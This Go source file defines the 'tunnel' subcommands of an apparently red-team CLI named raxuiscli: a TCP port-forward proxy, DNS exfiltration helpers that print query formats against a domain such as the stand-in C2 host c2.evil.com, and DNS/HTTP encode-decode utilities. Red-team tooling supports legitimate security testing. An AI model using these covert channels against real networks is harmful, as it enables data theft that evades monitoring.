package redteam

import (
	"fmt"
	"os"
	"os/signal"
	"raxuiscli/cmd"
	"raxuiscli/internal/redteam/tunnel"
	"syscall"

	"github.com/spf13/cobra"
)

var tunnelLocal string
var tunnelRemote string
var tunnelDomain string
var tunnelEncoding string
var tunnelChunkSize int

var tunnelCmd = &cobra.Command{
	Use:   "tunnel",
	Short: "Network tunneling utilities",
	Long: `Network tunneling and data exfiltration tools.

Create covert channels for data transfer through various protocols.

Examples:
  raxuiscli tunnel tcp --local :8080 --remote internal:80   # TCP proxy
  raxuiscli tunnel dns --domain c2.evil.com                 # DNS tunnel info
  raxuiscli tunnel encode "secret data" --method base64     # Encode for tunnel`,
	Run: func(cmd *cobra.Command, args []string) {
		cmd.Help()
	},
}

var tunnelTCPCmd = &cobra.Command{
	Use:   "tcp",
	Short: "TCP port forwarding",
	Long: `Create a TCP port forward/proxy.

Forwards traffic from a local port to a remote destination.`,
	Run: func(cmd *cobra.Command, args []string) {
		if tunnelLocal == "" || tunnelRemote == "" {
			fmt.Fprintln(os.Stderr, "Error: both --local and --remote are required")
			os.Exit(1)
		}

		proxy := tunnel.NewTCPProxy(tunnelLocal, tunnelRemote)

		fmt.Printf("Starting TCP proxy: %s -> %s\n", tunnelLocal, tunnelRemote)

		if err := proxy.Start(); err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}

		fmt.Println("Proxy started. Press Ctrl+C to stop.")

		// Wait for interrupt
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan

		fmt.Println("\nStopping proxy...")
		proxy.Stop()
	},
}

var tunnelDNSCmd = &cobra.Command{
	Use:   "dns",
	Short: "DNS tunneling information",
	Long: `DNS tunneling helpers and encoding.

Provides tools for encoding data for DNS exfiltration.`,
	Run: func(cmd *cobra.Command, args []string) {
		if tunnelDomain == "" {
			fmt.Fprintln(os.Stderr, "Error: --domain is required")
			os.Exit(1)
		}

		fmt.Println("\n[DNS TUNNEL CONFIGURATION]")
		fmt.Println("==========================")
		fmt.Printf("Domain:      %s\n", tunnelDomain)
		fmt.Printf("Encoding:    %s\n", tunnelEncoding)
		fmt.Printf("Chunk Size:  %d\n", tunnelChunkSize)

		fmt.Println("\nExample DNS queries for exfiltration:")
		fmt.Printf("  <seq>.<encoded_data>.%s\n", tunnelDomain)
		fmt.Printf("  0.SGVsbG8gV29ybGQ.%s\n", tunnelDomain)

		fmt.Println("\nServer-side capture (example):")
		fmt.Printf("  tcpdump -i any -n 'udp port 53 and host %s'\n", tunnelDomain)

		dt := tunnel.NewDNSTunnel(tunnelDomain, tunnelEncoding, tunnelChunkSize)
		sample := []byte("Hello, World!")
		chunks := dt.Encode(sample)

		fmt.Println("\nSample encoding:")
		fmt.Printf("  Input:  %s\n", string(sample))
		fmt.Printf("  Output: %v\n", chunks)
	},
}

var tunnelEncodeInput string
var tunnelEncodeMethod string

var tunnelEncodeCmd = &cobra.Command{
	Use:   "encode [data]",
	Short: "Encode data for tunneling",
	Long:  `Encode data for safe transmission through various channels.`,
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		data := []byte(args[0])

		fmt.Println("\n[TUNNEL ENCODING]")
		fmt.Println("=================")
		fmt.Printf("Input: %s\n", args[0])
		fmt.Printf("Length: %d bytes\n\n", len(data))

		// DNS-safe encoding
		dnsEncoded := tunnel.EncodeForDNS(data)
		fmt.Printf("DNS-safe:  %s\n", dnsEncoded)

		// Chunked for DNS
		dt := tunnel.NewDNSTunnel("example.com", tunnelEncodeMethod, 60)
		chunks := dt.Encode(data)
		fmt.Printf("DNS chunks (%s): %v\n", tunnelEncodeMethod, chunks)

		// HTTP encoding
		ht := tunnel.NewHTTPTunnel("", tunnelEncodeMethod, 0, 0)
		httpEncoded := ht.Encode(data)
		fmt.Printf("HTTP (%s): %s\n", tunnelEncodeMethod, httpEncoded)
	},
}

var tunnelDecodeCmd = &cobra.Command{
	Use:   "decode [data]",
	Short: "Decode tunneled data",
	Long:  `Decode data that was encoded for tunneling.`,
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		encoded := args[0]

		fmt.Println("\n[TUNNEL DECODING]")
		fmt.Println("=================")
		fmt.Printf("Input: %s\n\n", encoded)

		// Try DNS decoding
		if decoded, err := tunnel.DecodeFromDNS(encoded); err == nil {
			fmt.Printf("DNS-decoded: %s\n", string(decoded))
		}

		// Try various decodings with HTTP tunnel
		ht := tunnel.NewHTTPTunnel("", "base64", 0, 0)
		if decoded, err := ht.Decode(encoded); err == nil {
			fmt.Printf("Base64: %s\n", string(decoded))
		}

		ht = tunnel.NewHTTPTunnel("", "hex", 0, 0)
		if decoded, err := ht.Decode(encoded); err == nil {
			fmt.Printf("Hex: %s\n", string(decoded))
		}
	},
}

func init() {
	cmd.RootCmd.AddCommand(tunnelCmd)

	// TCP subcommand
	tunnelCmd.AddCommand(tunnelTCPCmd)
	tunnelTCPCmd.Flags().StringVarP(&tunnelLocal, "local", "l", "", "Local address (e.g., :8080)")
	tunnelTCPCmd.Flags().StringVarP(&tunnelRemote, "remote", "r", "", "Remote address (e.g., internal:80)")

	// DNS subcommand
	tunnelCmd.AddCommand(tunnelDNSCmd)
	tunnelDNSCmd.Flags().StringVarP(&tunnelDomain, "domain", "d", "", "Domain for DNS tunnel")
	tunnelDNSCmd.Flags().StringVarP(&tunnelEncoding, "encoding", "e", "base64", "Encoding method")
	tunnelDNSCmd.Flags().IntVarP(&tunnelChunkSize, "chunk", "c", 60, "Chunk size")

	// Encode subcommand
	tunnelCmd.AddCommand(tunnelEncodeCmd)
	tunnelEncodeCmd.Flags().StringVarP(&tunnelEncodeMethod, "method", "m", "base64", "Encoding method (base64, hex)")

	// Decode subcommand
	tunnelCmd.AddCommand(tunnelDecodeCmd)
}
